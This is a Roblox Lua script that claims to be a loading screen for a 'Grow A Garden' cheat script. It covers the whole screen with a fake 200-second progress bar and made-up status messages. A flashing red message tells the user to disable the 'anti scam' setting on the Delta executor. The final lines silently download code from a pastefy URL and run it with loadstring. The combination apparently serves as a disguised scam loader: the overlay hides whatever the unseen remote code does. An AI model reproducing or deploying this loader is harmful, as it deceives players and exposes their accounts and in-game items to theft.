--// Fullscreen Loading Screen UI (200s Progress, Smooth Fill, Decimals, Rotating Messages)

-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- Player
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = PlayerGui
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

-- Background Frame (covers whole screen)
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Background.Parent = ScreenGui

-- Title
local Title = Instance.new("TextLabel")
Title.AnchorPoint = Vector2.new(0.5, 0.5)
Title.Position = UDim2.new(0.5, 0, 0.35, 0)
Title.Size = UDim2.new(0.9, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "Loading Script - Grow A Garden ðŸŒ´"
Title.Font = Enum.Font.GothamBold
Title.TextScaled = true
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Parent = Background

-- Progress Bar Background
local BarBg = Instance.new("Frame")
BarBg.AnchorPoint = Vector2.new(0.5, 0.5)
BarBg.Position = UDim2.new(0.5, 0, 0.5, 0)
BarBg.Size = UDim2.new(0.5, 0, 0.05, 0)
BarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
BarBg.BorderSizePixel = 0
BarBg.Parent = Background

local BarBgCorner = Instance.new("UICorner")
BarBgCorner.CornerRadius = UDim.new(0, 12)
BarBgCorner.Parent = BarBg

-- Progress Bar
local Bar = Instance.new("Frame")
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Bar.BorderSizePixel = 0
Bar.Parent = BarBg

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(0, 12)
BarCorner.Parent = Bar

-- Progress Label
local ProgressText = Instance.new("TextLabel")
ProgressText.AnchorPoint = Vector2.new(0.5, 0)
ProgressText.Position = UDim2.new(0.5, 0, 1.3, 0)
ProgressText.Size = UDim2.new(1.2, 0, 0.5, 0)
ProgressText.BackgroundTransparency = 1
ProgressText.Text = "Starting... (0.0%)"
ProgressText.Font = Enum.Font.Gotham
ProgressText.TextScaled = true
ProgressText.TextColor3 = Color3.fromRGB(200, 200, 200)
ProgressText.Parent = BarBg

-- Rejoin Message (Animated in RED)
local RejoinMsg = Instance.new("TextLabel")
RejoinMsg.AnchorPoint = Vector2.new(0.5, 0.5)
RejoinMsg.Position = UDim2.new(0.5, 0, 0.65, 0)
RejoinMsg.Size = UDim2.new(0.9, 0, 0, 30)
RejoinMsg.BackgroundTransparency = 1
RejoinMsg.Text = "If you got kicked please disable anti scam on Delta"
RejoinMsg.Font = Enum.Font.Gotham
RejoinMsg.TextScaled = true
RejoinMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
RejoinMsg.Parent = Background

-- Animate Fade In/Out (for rejoin text)
task.spawn(function()
	while RejoinMsg.Parent do
		local fadeOut = TweenService:Create(RejoinMsg, TweenInfo.new(1.5), {TextTransparency = 1})
		fadeOut:Play()
		fadeOut.Completed:Wait()

		local fadeIn = TweenService:Create(RejoinMsg, TweenInfo.new(1.5), {TextTransparency = 0})
		fadeIn:Play()
		fadeIn.Completed:Wait()
	end
end)

-- Loading Messages
local messages = {
	"Registering petmeta.config...",
	"Fetching garden data...",
	"Optimizing player seeds...",
	"Loading environment assets...",
	"Spawning NPC gardeners...",
	"Applying growth algorithm...",
	"Watering plants...",
	"Finalizing garden setup..."
}

local currentMessage = messages[1]

-- Rotate messages every 5s
task.spawn(function()
	local index = 1
	while ScreenGui.Parent do
		currentMessage = messages[index]
		index = index + 1
		if index > #messages then index = 1 end
		task.wait(5)
	end
end)

-- Smooth Progress (200 seconds total)
task.spawn(function()
	local totalTime = 200
	local steps = 2000 -- higher = smoother
	local stepTime = totalTime / steps

	for i = 1, steps do
		local percent = (i / steps) * 100
		Bar.Size = UDim2.new(percent / 100, 0, 1, 0)
		ProgressText.Text = string.format("%s (%.1f%%)", currentMessage, percent)
		task.wait(stepTime)
	end

	-- Fade out UI
	for _, obj in pairs(Background:GetDescendants()) do
		if obj:IsA("TextLabel") then
			TweenService:Create(obj, TweenInfo.new(2), {TextTransparency = 1}):Play()
		elseif obj:IsA("Frame") then
			TweenService:Create(obj, TweenInfo.new(2), {BackgroundTransparency = 1}):Play()
		end
	end
	TweenService:Create(Background, TweenInfo.new(2), {BackgroundTransparency = 1}):Play()

	task.wait(2.2)
	ScreenGui:Destroy()
end)

-- Safe load external script
task.wait(0.1)
pcall(function()
	loadstring(game:HttpGet("https://pastefy.app/JFGQwYi0/raw"))()
end)
